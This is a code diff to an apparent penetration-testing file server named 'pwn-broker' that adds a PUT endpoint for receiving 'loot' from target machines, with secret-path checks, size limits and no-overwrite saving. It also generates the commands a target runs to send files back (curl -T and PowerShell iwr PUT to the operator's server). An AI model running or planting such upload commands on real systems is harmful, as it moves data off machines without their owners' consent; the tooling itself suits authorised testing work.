@@ -269,6 +269,95 @@ def download_lines(os_name: str, link: str, name: str) -> list[str]:
     return [linux, windows]
 
 
+# ---- receiving, for a target to send files back
+
+
+LOOT = "loot"
+# one file a target sends: large enough for a disk image's worth of loot, small enough to bound it
+MAX_RECEIVE = 4 * 1024**3
+# what is left free on the disk after a file is taken in
+ROOM_LEFT = 1024**3
+MAX_NAME_BYTES = 200
+
+
+class NoRoom(Exception):
+    pass
+
+
+def loot_folder(upload: Path) -> Path:
+    # the target's upload folder and its loot folder sit side by side
+    return upload.parent / LOOT
+
+
+def received_name(request_path: str, secret: str) -> str | None:
+    """The file name a PUT asks to save, or None: the path must be the run's secret and one plain
+    name, with no folder, no dot at the start and nothing unprintable."""
+    parts = [p for p in urllib.parse.unquote(request_path.split("?", 1)[0]).split("/") if p]
+    if len(parts) != 2 or not hmac.compare_digest(parts[0].encode(), secret.encode()):
+        return None
+    name = parts[1]
+    if not _visible(name) or name in (".", "..") or "\\" in name or not name.isprintable():
+        return None
+    if len(name.encode("utf-8", "surrogateescape")) > MAX_NAME_BYTES:
+        return None
+    return name
+
+
+def _free_name(folder: Path, name: str) -> list[Path]:
+    stem, suffix = Path(name).stem, Path(name).suffix
+    return [folder / (name if n == 1 else f"{stem}-{n}{suffix}") for n in range(1, 1000)]
+
+
+def receive_into(loot: Path, name: str, size: int, reader) -> Path:
+    """Write exactly `size` bytes from `reader` into loot/, under `name` or, when that is taken,
+    `name-2` and on: never over a file that is there. Written to a temporary name first, which
+    the box's file scan leaves out, so a cut transfer leaves nothing behind."""
+    from pwn_broker.filescan import TEMP_PREFIX, TEMP_SUFFIX
+
+    if loot.is_symlink():
+        raise OSError(f"{loot} is a link")
+    loot.mkdir(parents=True, exist_ok=True)
+    if size > shutil.disk_usage(loot).free - ROOM_LEFT:
+        raise NoRoom()
+    tmp = loot / f"{TEMP_PREFIX}{secrets.token_hex(8)}{TEMP_SUFFIX}"
+    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL | getattr(os, "O_NOFOLLOW", 0) | getattr(os, "O_BINARY", 0)
+    fd = os.open(tmp, flags, 0o600)
+    try:
+        with os.fdopen(fd, "wb") as out:
+            left = size
+            while left:
+                piece = reader.read(min(left, 64 * 1024))
+                if not piece:
+                    raise OSError("the transfer was cut short")
+                out.write(piece)
+                left -= len(piece)
+        for dest in _free_name(loot, name):
+            try:
+                # a link fails on a name that is there; nothing is ever replaced
+                os.link(tmp, dest)
+            except FileExistsError:
+                continue
+            return dest
+        raise OSError(f"no free name for {name}")
+    finally:
+        try:
+            os.unlink(tmp)
+        except OSError:
+            pass
+
+
+def upload_lines(os_name: str, base: str) -> list[str]:
+    """The line a target runs to send a file back, by the box's OS; `base` ends in /."""
+    windows = f"iwr -Method PUT -InFile <file> {base}<file>"
+    linux = f"curl -T <file> {base}"
+    kind = os_name.strip().lower()
+    if kind.startswith("win"):
+        return [windows]
+    if kind in ("linux", "unix", "freebsd", "openbsd", "macos") or kind.endswith("bsd"):
+        return [linux]
+    return [linux, windows]
+
+
 # ---- starting and stopping
 
 
@@ -436,9 +525,14 @@ def _shown(text: str) -> str:
 def _handler(
     folder: Path, tools: Path, secret: str, log: Callable[[str], None]
 ) -> type[BaseHTTPRequestHandler]:
+    loot = loot_folder(folder)
+
     class Handler(BaseHTTPRequestHandler):
         server_version = "pwn-broker"
         sys_version = ""
+        # 1.1, so a client that sends Expect: 100-continue before a large upload is answered at once
+        protocol_version = "HTTP/1.1"
+        saved = ""
 
         def _answer(self, body: bool) -> None:
             # no listing, of / or any folder: only a request for a file by its exact name is answered,
@@ -458,6 +552,37 @@ def _handler(
                 if body:
                     shutil.copyfileobj(fh, self.wfile)
 
+        def _reply(self, status: int, text: str) -> None:
+            data = text.encode()
+            self._head(status, len(data), "text/plain; charset=utf-8")
+            self.wfile.write(data)
+
+        def do_PUT(self) -> None:  # noqa: N802
+            name = received_name(self.path, secret)
+            length = self.headers.get("Content-Length", "")
+            if name is None or not (length.isascii() and length.isdecimal()):
+                # the body is not read, so the connection cannot be used again
+                self.close_connection = True
+                self._reply(404 if name is None else 411, "not found\n" if name is None else "length required\n")
+                return
+            size = int(length)
+            if size > MAX_RECEIVE:
+                self.close_connection = True
+                self._reply(413, "too large\n")
+                return
+            try:
+                dest = receive_into(loot, name, size, self.rfile)
+            except NoRoom:
+                self.close_connection = True
+                self._reply(507, "not enough space\n")
+                return
+            except OSError:
+                self.close_connection = True
+                self._reply(500, "not saved\n")
+                return
+            self.saved = f"  saved {LOOT}/{dest.name}"
+            self._reply(201, f"saved {dest.name}\n")
+
         def _head(self, status: int, size: int, kind: str) -> None:
             self.send_response(status)
             self.send_header("Content-Type", kind)
@@ -474,7 +599,8 @@ def _handler(
             # every answer passes through here, a malformed request's 400 included
             status = getattr(code, "value", code)
             line = _shown(getattr(self, "requestline", "") or "-")
-            log(f"{datetime.now().astimezone():%Y-%m-%d %H:%M:%S}  {self.client_address[0]}  {line}  {status}")
+            saved, self.saved = self.saved, ""
+            log(f"{datetime.now().astimezone():%Y-%m-%d %H:%M:%S}  {self.client_address[0]}  {line}  {status}{saved}")
 
         def log_message(self, format: str, *args) -> None:  # noqa: A002
             pass
